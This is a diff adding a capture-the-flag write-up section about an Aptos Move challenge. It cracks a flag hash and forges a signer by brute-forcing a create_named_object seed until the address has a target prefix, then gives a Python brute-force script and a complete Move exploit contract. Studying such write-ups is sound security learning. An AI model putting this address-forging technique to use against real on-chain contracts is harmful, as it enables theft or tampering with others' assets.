@@ -67,7 +67,53 @@ module solution::exploit {
 
 ## U Can't Touch This
 
+Unlike the previous challenge, this challenge checks the `touched_this` function. You need to make the sha256 hash of the `flag.data` equal to `28ae486bc9f63979792edfd396c29c8ee275a8248ffc4da9d612eec60d6837f3`. So we can get the original value of `flag.data` by cracking the hash.
 
+You can query this hash on the [CrackStation](https://crackstation.net/), it will tell you that the original value of `flag.data` is `osec`. We just get the original value and need to explore the way to change the `flag.data` to the target value.
+
+Obviously, the `touch_this` function can change `flag.data` to the value you pass in. But it will call `check_admin` function first, that function will check the first and second bytes of the address of the signer. If the first byte is not `0xf7` or the second byte is not `0x5d`, then the function will abort.
+
+Before exploiting its vulnerability, we can learn something about `signer` in the aptos move language: https://aptos.dev/en/build/smart-contracts/book/signer. It says that `In other words, all of the signer arguments must come first`. A obvious idea is to forge a signer, so we just need to know how the address of the signer is calculated.
+
+You can easily find the `generate_signer` function in `aptos_framework::object` module, it will generate a signer with the `ConstructorRef` you pass in and the `ConstructorRef.self` corresponding to the address of the signer. Going further, you can find many functions in `aptos_framework::object` module that return `ConstructorRef` type, but what we need is a controllable address. The function that satisfies the condition is `create_named_object`.
+
+The calculation of the address of the signer in the `create_named_object` function is as follows:
+```
+address = sha3(creator.address + seed + OBJECT_FROM_SEED_ADDRESS_SCHEME)
+```
+So we just need to brute force the `seed` to get the address we want. Below is a simple python script to brute force the seed.
+
+```python
+import hashlib
+import random
+
+prefix = bytes.fromhex("9c3b634ac05d0af393e0f93b9b19b61e7cac1c519f566276aa0c6fd15dac12aa")
+suffix = bytes.fromhex("fe")
+while True:
+    seed = random.randbytes(8)
+    if hashlib.sha3_256(prefix + seed + suffix).hexdigest().startswith("f75d"):
+        print(seed.hex())
+        break
+```
+
+And the solution contract is as follows:
+
+```move
+module solution::exploit {
+    use uctt::this::{Self, SafeDepositBox};
+    use aptos_framework::object;
+
+    public entry fun solve(account: &signer) {
+        let addr = @0x5d26592cd1c87c51aec9a4f0071011905b534b62a0eae4c5966ef8f13b5f4011;
+        let safebox = object::address_to_object<SafeDepositBox>(addr);
+        let cdef = object::create_named_object(account, x"4b5c981a4f784a79");
+        let tsigner = object::generate_signer(&cdef);
+        let flag = this::open_safe(safebox, &tsigner);
+        flag = this::touch_this(flag, x"6f736563", &tsigner);
+        this::close_safe(flag, account);
+    }
+}
+```
 
 ![](./images/3.png)
 
